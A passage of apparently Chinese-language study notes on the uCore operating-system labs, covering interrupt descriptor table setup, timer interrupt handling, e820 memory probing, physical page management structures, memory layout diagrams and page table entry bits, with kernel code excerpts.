class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-comment">// __vectors定义于vector.S中</span><br>  <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++)<br>      <span class="hljs-comment">// 目标idt项为idt[i]</span><br>      <span class="hljs-comment">// 该idt项为内核代码，所以使用GD_KTEXT段选择子</span><br>      <span class="hljs-comment">// 中断处理程序的入口地址存放于__vectors[i]</span><br>      <span class="hljs-comment">// 特权级为DPL_KERNEL</span><br>      SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>  <span class="hljs-comment">// 设置从用户态转为内核态的中断的特权级为DPL_USER</span><br>  <span class="hljs-comment">// 好像就是int 0x80, 不过我没有在任何地方看到说明, 尝试自己写这一段代码花了好多无谓的时间</span><br>  SETGATE(idt[T_SWITCH_TOK], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);<br>  <span class="hljs-comment">// 加载该IDT</span><br>  lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>编程完善trap.c中的中断处理函数trap_dispatch**(called by trap(), and trap() called in trapentry.S)**，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p><ul><li><p>这个实现还是比较简单的，注释都说清楚了</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IRQ_OFFSET + IRQ_TIMER:        <span class="hljs-comment">// 全局变量ticks定义于kern/driver/clock.c</span><br>ticks++;       <br><span class="hljs-keyword">if</span>(ticks % TICK_NUM == <span class="hljs-number">0</span>)            <br>        print_ticks();        <br><span class="hljs-keyword">break</span>;    <span class="hljs-comment">// .........</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>结果:</p></li></ul><img src="https://i.loli.net/2021/11/20/n8cShiWkulDqzpP.png" alt="image-20211120131815160" style="zoom:80%;" /><h3 id="拓展练习"><a href="#拓展练习" class="headerlink" title="拓展练习"></a>拓展练习</h3><blockquote><p>Challenge 1: 扩展proj4,增加syscall功能，即增加一用户态函数（可执行一特定系统调用：获得时钟计数值），当内核初始完毕后，可从内核态返回到用户态的函数，而用户态的函数又通过系统调用得到内核态的服务</p></blockquote><p>详见知识点</p><blockquote><p>Challenge 2:用键盘实现用户模式内核模式切换。具体目标是：“键盘输入3时切换到用户模式，键盘输入0时切换到内核模式”。 基本思路是借鉴软中断(syscall功能)的代码，并且把trap.c中软中断处理的设置语句拿过来。</p></blockquote><h1 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-探测系统物理内存布局"><a href="#1-探测系统物理内存布局" class="headerlink" title="1.探测系统物理内存布局"></a>1.探测系统物理内存布局</h3><ul><li>当 ucore 被启动之后，最重要的事情就是知道还有多少内存可用，一般来说，获取内存大小的方法由 BIOS 中断调用和直接探测两种。但BIOS 中断调用方法是一般只能在实模式下完成，而直接探测方法必须在保护模式下完成。通过 BIOS 中断获取内存布局有三种方式，都是基于INT 15h中断，分别为88h e801h e820h。但是 并非在所有情况下这三种方式都能工作。在 Linux kernel 里，采用的方法是依次尝试这三 种方法。而在本实验中，我们通过e820h中断获取内存信息。因为e820h中断必须在实模式下使用，所以我们在 bootloader 进入保护模式之前调用这个 BIOS 中断，并且把 e820 映 射结构<strong>保存在物理地址0x8000</strong>处。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_5_probe_phymem_methods.html">INT 15h调用</a>完成后, 将返回值存入一个结构体中:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e820map</span> &#123;</span><br><span class="hljs-keyword">int</span> nr_map;<span class="hljs-comment">//四字节, map中的元素个数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> addr;<span class="hljs-comment">// 可用内存的起始地址</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<span class="hljs-comment">// 内存块大小</span><br>        <span class="hljs-keyword">long</span> type;    <span class="hljs-comment">// 四字节, 某块内存的属性。1标识可被使用内存块；2表示保留的内存块，不可映射</span><br>    &#125; <span class="hljs-built_in">map</span>[E820MAX];<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>​    存入的过程为:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">probe_memory:<br>    movl $0, 0x8000   # 初始化，向内存地址0x8000，即uCore结构e820map中的成员nr_map中写入0<br>    xorl %ebx, %ebx   # 初始化%ebx为0，这是int 0x15的其中一个参数<br>    movw $0x8004, %di # 初始化%di寄存器，使其指向结构e820map中的成员数组map<br>start_probe:<br>    movl $0xE820, %eax  # BIOS 0x15中断的子功能编号 %eax == 0xE820<br>    movl $20, %ecx    # 存放地址范围描述符的内存大小，至少20<br>    movl $SMAP, %edx  # 签名， %edx == 0x534D4150h(&quot;SMAP&quot;字符串的ASCII码)<br>    int $0x15     # 调用0x15中断<br>    jnc cont      # 如果该中断执行失败，则CF标志位会置1，此时要通知UCore出错<br>    movw $12345, 0x8000 # 向结构e820map中的成员nr_map中写入特殊信息，报告当前错误<br>    jmp finish_probe    # 跳转至结束，不再探测内存<br>cont:<br>    addw $20, %di   # 如果中断执行正常，则目标写入地址就向后移动一个位置<br>    incl 0x8000     # e820::nr_map++<br>    cmpl $0, %ebx   # 执行中断后，返回的%ebx是原先的%ebx加一。如果%ebx为0，则说明当前内存探测完成<br>    jnz start_probe<br>finish_probe:<br></code></pre></div></td></tr></table></figure><p><code>edata</code>表示<code>kernel</code>的<code>data</code>段结束地址；<code>end</code>表示<code>bss</code>段的结束地址（即整个<code>kernel</code>的结束地址）</p><p><code>edata[]</code>和 <code>end[]</code>这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的结束地址，它们不在任何一个.S、.c或.h文件中定义，但仍然可以在源码文件中使用。</p><h3 id="2-管理物理-内存"><a href="#2-管理物理-内存" class="headerlink" title="2.管理物理 内存"></a>2.管理<em>物理</em> 内存</h3><ul><li>每一个物理页的属性用结构Page来表示</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;        <span class="hljs-comment">// page frame&#x27;s reference counter</span><br>    <span class="hljs-keyword">uint32_t</span> flags; <span class="hljs-comment">// array of flags that describe the status of the page frame</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<span class="hljs-comment">// the num of free *page*, used in first fit pm manager</span><br>    <span class="hljs-keyword">list_entry_t</span> page_link;<span class="hljs-comment">// free list link</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>而flag第一位和第二位(即bit 0 and bit 1, PG_reserved和PG_property的0和1是指第几位):</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Flags describing the status of a page frame */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_reserved                 0       <span class="hljs-comment">// the page descriptor is reserved for kernel or unusable</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_property                 1       <span class="hljs-comment">// the member &#x27;property&#x27; is valid (free or not)</span></span><br></code></pre></div></td></tr></table></figure><p>​    需要注意的是用到property成员变量的这个Page比较特殊，是这个连续内存空闲块地址<strong>最小的一页</strong>（即头一页， Head Page）,<br>​    用bit PG_property来enable</p><ul><li>使用btl指令置位某一个bit:</li></ul><blockquote><p>BTS %1,  %2     :先把%2对应的内存地址的第%1位的值填入cflags寄存器的CF，然后把该位<strong>置位</strong>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SetPageReserved(page)       set_bit(PG_reserved, &amp;((page)-&gt;flags)) <span class="hljs-comment">//setbit使用的是内联汇编形式的btl指令</span></span><br></code></pre></div></td></tr></table></figure><ul><li>管理空闲块</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* free_area_t - maintains a doubly linked list to record free (unused) pages */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">list_entry_t</span> free_list;                                <span class="hljs-comment">// the list header</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_free;                                 <span class="hljs-comment">// num of free pages in this free list</span><br>&#125; <span class="hljs-keyword">free_area_t</span>;<br></code></pre></div></td></tr></table></figure><ul><li>pmm_manager(): 一个函数指针列表, 用于引用管理内存的函数, 指向这个结构体的指针也是<code>pmm_manager</code><br>项目定义了一个<code>default_pmm_manager</code>, 每一个函数指向的具体函数定义在default_pmm_init.c中, 将此结构体地址赋值给<br>(pmm_manager *)pmm_manager, 可以更改为其他内存分配算法</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pmm_manager</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name; <span class="hljs-comment">//物理内存页管理器的名字</span><br>            <span class="hljs-keyword">void</span> (*init)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//初始化内存管理器</span><br>            <span class="hljs-keyword">void</span> (*init_memmap)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//初始化管理空闲内存页的数据结构</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *(*<span class="hljs-title">alloc_pages</span>)(<span class="hljs-title">size_t</span> <span class="hljs-title">n</span>);</span> <span class="hljs-comment">//分配n个物理内存页</span><br>            <span class="hljs-keyword">void</span> (*free_pages)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//释放n个物理内存页</span><br>            <span class="hljs-keyword">size_t</span> (*nr_free_pages)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//返回当前剩余的空闲页数</span><br>            <span class="hljs-keyword">void</span> (*check)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//用于检测分配/释放实现是否正确的辅助函数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><code>kern_init()</code>中<code>pmm_init()</code>的==<code>page_init()</code>==部分内容</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// code above is traverse all memmap(e820map) to search the maxpa and print the memmap out</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> end[];<br><br><span class="hljs-comment">// calc the sum of pages</span><br>npage = maxpa / PGSIZE;<br><span class="hljs-comment">// </span><br>pages = (struct Page *)ROUNDUP((<span class="hljs-keyword">void</span> *)end, PGSIZE);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; npage; i ++) &#123;<br>SetPageReserved(pages + i);<br>&#125;<br><br><span class="hljs-keyword">uintptr_t</span> freemem = PADDR((<span class="hljs-keyword">uintptr_t</span>)pages + <span class="hljs-keyword">sizeof</span>(struct Page) * npage);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*    SetPageReserved只需把物理地址对应的Page结构中的flags标志设置为PG_reserved ，表示这些</span><br><span class="hljs-comment">*页已经被使用了，将来不能被用于分配。</span><br><span class="hljs-comment">*    而init_memmap函数则是把空闲物理页对应的Page结构中的flags和引用计数ref清零，并加到</span><br><span class="hljs-comment">*free_area.free_list指向的双向列表中，为将来的空闲页管理做好初始化准备工作。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// code below corrects free physical blocks&#x27; boundaries and initialized </span><br><span class="hljs-comment">// page(not page table), adding page to freelist.</span><br><span class="hljs-comment">// then, all physical pages&#x27; info are stored in base address (struct Page *)pages.</span><br><span class="hljs-comment">// page(s) can be accessed by `struct Page *pages;`, just like array.</span><br></code></pre></div></td></tr></table></figure><h3 id="3-内存空间布局"><a href="#3-内存空间布局" class="headerlink" title="3.内存空间布局"></a>3.内存空间布局</h3><ul><li><p>在uCore中，CPU先在bootasm.S（实模式）中通过调用BIOS中断，将物理内存的相关描述符写入特定位置<code>0x8000</code>，然后读入kernel至物理地址<code>0x10000</code>、虚拟地址<code>0xC0000000</code>。</p></li><li><p>而kernel在<code>page_init</code>函数中，读取物理内存地址<code>0x8000</code>处的内存，查找最大物理地址，并计算出所需的<strong>页面数</strong>。虚拟页表<code>VPT(Virtual Page Table)</code>的地址紧跟<code>kernel</code>，其地址为4k对齐。虚拟地址空间结构如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G -----------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                     |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT ----------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                     |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP ------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |    Remapped Physical Memory     | RW/-- KMEMSIZE=896MB</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *     KERNBASE -----&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><p>完成<strong>物理内存页管理初始化工作</strong>后，其物理地址的分布空间如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">+----------------------+ &lt;- <span class="hljs-number">0xFFFFFFFF</span>(4GB)       ----------------------------  4GB<br>|  一些保留内存，例如用于|                                保留空间<br>|   32bit设备映射空间等  |<br>+----------------------+ &lt;- 实际物理内存空间结束地址 ----------------------------<br>|                      |<br>|                      |<br>|     用于分配的         |                                 可用的空间<br>|    空闲内存区域        |<br>|                      |<br>|                      |<br>|                      |<br>+----------------------+ &lt;- 空闲内存起始地址      ----------------------------  <br>|     VPT页表存放位置      |                                VPT页表存放的空间   (4MB左右)<br>+----------------------+ &lt;- bss段结束处           ----------------------------<br>|uCore的text、data、bss |                              uCore各段的空间<br>+----------------------+ &lt;- <span class="hljs-number">0x00100000</span>(1MB)       ---------------------------- 1MB<br>|       BIOS ROM       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000F0000</span>(960KB)<br>|     16bit设备扩展ROM  |                             显存与其他ROM映射的空间<br>+----------------------+ &lt;- <span class="hljs-number">0x000C0000</span>(768KB)<br>|     CGA显存空间       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000B8000</span>            ---------------------------- 736KB<br>|        空闲内存       |<br>+----------------------+ &lt;- <span class="hljs-number">0x00011000</span>(+4KB)          uCore header的内存空间<br>| uCore的ELF header数据 |<br>+----------------------+ &lt;-<span class="hljs-number">0x00010000</span>             ---------------------------- 64KB<br>|       空闲内存        |<br>+----------------------+ &lt;- 基于bootloader的大小          bootloader的<br>|      bootloader的   |                                    内存空间<br>|     text段和data段    |<br>+----------------------+ &lt;- <span class="hljs-number">0x00007C00</span>            ---------------------------- 31KB<br>|   bootloader和uCore  |<br>|      共用的堆栈       |                                 堆栈的内存空间<br>+----------------------+ &lt;- 基于栈的使用情况<br>|     低地址空闲空间    |<br>+----------------------+ &lt;-  <span class="hljs-number">0x00000000</span>           ---------------------------- 0KB<br></code></pre></div></td></tr></table></figure><p>易知，其页表地址之上的物理内存空间是空闲的（除去保留的内存），故将该物理地址之下的物理空间对应的页表全部设置为保留(reserved)。并将这些空闲的内存全部添加进页表项中。</p></li></ul><h3 id="4-分配算法实现"><a href="#4-分配算法实现" class="headerlink" title="4.分配算法实现"></a>4.分配算法实现</h3><blockquote><p>在default_pmm.c中</p><p>实现了最简单的first-fit, 其他算法为challenge</p></blockquote><h3 id="5-段页式存储管理"><a href="#5-段页式存储管理" class="headerlink" title="5.段页式存储管理"></a>5.段页式存储管理</h3><h4 id="总体框架、分页机制图"><a href="#总体框架、分页机制图" class="headerlink" title="总体框架、分页机制图"></a>总体框架、分页机制图</h4><img src="https://i.loli.net/2021/11/20/Uvnt9ZJfP32FMbr.png" alt="image-20211120231536312" style="zoom:67%;" /><p>Page Directory is 4Kbyte-alignd, 所以CR3给的32位地址其实低12位为0, 只要把32:12和Linear address的31:22拼成一个32位地址即可:</p><img src="https://i.loli.net/2021/11/23/YQoyfDqFVTZPs6C.png" alt="image-20211120233531488" style="zoom:67%;" /><h4 id="虚拟页表和页目录表结构"><a href="#虚拟页表和页目录表结构" class="headerlink" title=" 虚拟页表和页目录表结构"></a><span id="vpt&pdt"> </span>虚拟页表和页目录表结构</h4><p>每个<strong>页表项</strong>（PTE）都由一个32位整数来存储数据，其结构如下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">      31-12      9-11     8    7    6   5   4      3    2   1   0<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br>|     Offset   | Avail | MBZ | PS | D | A | PCD | PWT | U | W | P |<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br></code></pre></div></td></tr></table></figure><ul><li>0 - <strong>P</strong>resent: 表示当前PTE所指向的物理页面是否驻留在内存中</li><li>1 - <strong>W</strong>riteable: 表示是否允许读写</li><li>2 - <strong>U</strong>ser: 表示该页的访问所需要的特权级。即User(ring 3)是否允许访问</li><li>3 - <strong>P</strong>age<strong>W</strong>rite<strong>T</strong>hough: 表示是否使用write through缓存写策略</li><li>4 - <strong>P</strong>age<strong>C</strong>ache<strong>D</strong>isable: 表示是否<strong>不对</strong>该页进行缓存</li><li>5 - <strong>A</strong>ccess: 表示该页是否已被访问过</li><li>6 - <strong>D</strong>irty: 表示该页是否已被修改</li><li>7 - <strong>P</strong>age<strong>S</strong>ize: 表示该页的大小</li><li>8 - <strong>M</strong>ust<strong>B</strong>e<strong>Z</strong>ero: 该位必须保留为0</li><li>9-11 - <strong>Avail</strong>able: 第9-11这三位并没有被内核或中断所使用，可保留给OS使用。</li><li>12-31 - Offset: 目标<strong>物理</strong>地址的高20位。</li></ul><p><strong>页目录表:</strong> </p><img src="https://i.loli.net/2021/11/23/9B45OFTQWedfhw1.png" alt="image-20211123104109784" style="zoom:80%;" /><table><thead><tr><th>Bit Position(s)</th><th>Contents</th></tr></thead><tbody><tr><td>0(P)</td><td>Present: must be 1 to reference a page table</td></tr><tr><td>1(R/W)</td><td>Read/write; if 0,writes may not be allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>2(U/S)</td><td>User/supervisor, if 0, user-mode accesses are not allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>3(PWT)</td><td>Page-level write-through; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>4(PCD)</td><td>Page-level cache disable; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>5(A)</td><td>Accessed; indicates whether this entry has been used for linear-address translation (see Section 4.8)</td></tr><tr><td>6</td><td>lgnored</td></tr><tr><td>7(PS)</td><td>lf CR4.PSE= 1, must be 0 (otherwise, this entry maps a 4-MByte page; see Table 4-4); otherwise, ignored</td></tr><tr><td>11:8</td><td>lgnored</td></tr><tr><td>31:12</td><td><strong>Physical address</strong> of 4-KByte aligned page table referenced by this entry</td></tr></tbody></table><h3 id="6-内存初始化函数pmm-init"><a href="#6-内存初始化函数pmm-init" class="headerlink" title="6.内存初始化函数pmm_init()"></a>6.内存初始化函数pmm_init()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">pmm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 装在cr3的物理地址</span><br>    boot_cr3 = PADDR(boot_pgdir);<br>    <br>    init_pmm_manager();<br><br>    <span class="hljs-comment">// detect physical memory space in 0~KERNMSIZE, reserve already used memory,</span><br>    <span class="hljs-comment">// then use pmm-&gt;init_memmap to create free page list</span><br>    page_init();<br><br>    <span class="hljs-comment">// some simple check</span><br>    check_alloc_page();<br>    check_pgdir();<br>    <span class="hljs-keyword">static_assert</span>(KERNBASE % PTSIZE == <span class="hljs-number">0</span> &amp;&amp; KERNTOP % PTSIZE == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// recursively insert boot_pgdir in itself</span><br>    <span class="hljs-comment">// to form a virtual page table at virtual address VPT</span><br>    boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br><br>    <span class="hljs-comment">// map all physical memory to linear memory with base linear addr KERNBASE</span><br>    <span class="hljs-comment">// linear_addr KERNBASE ~ KERNBASE + KMEMSIZE = phy_addr 0 ~ KMEMSIZE</span><br>    boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="hljs-number">0</span>, PTE_W);<br><br>    <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>    <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>    gdt_init();<br><br>    <span class="hljs-comment">//now the basic virtual memory map(see memalyout.h) is established.</span><br>    <span class="hljs-comment">//check the correctness of the basic virtual memory map.</span><br>    check_boot_pgdir();<br>    print_pgdir();<br>    kmalloc_init();<span class="hljs-comment">//just print some words</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-链接脚本与地址映射"><a href="#7-链接脚本与地址映射" class="headerlink" title="7.链接脚本与地址映射"></a>7.链接脚本与地址映射</h3><ul><li><strong>edata[]和 end[]这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的起始地址或结束地址等，它们不在任何一个.S、.c或.h文件中定义。</strong> </li><li><strong>逻辑地址或虚拟地址是可执行代码在编译的时候由链接器生成的</strong> </li><li>ucore内核的链接地址==ucore内核的虚拟地址；boot loader加载ucore内核用到的加载地址==ucore内核的物理地址。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_7_phymemlab_concepts.html">-&gt;详见实验指导书&lt;-</a> </li></ul><h4 id="地址映射的四个阶段"><a href="#地址映射的四个阶段" class="headerlink" 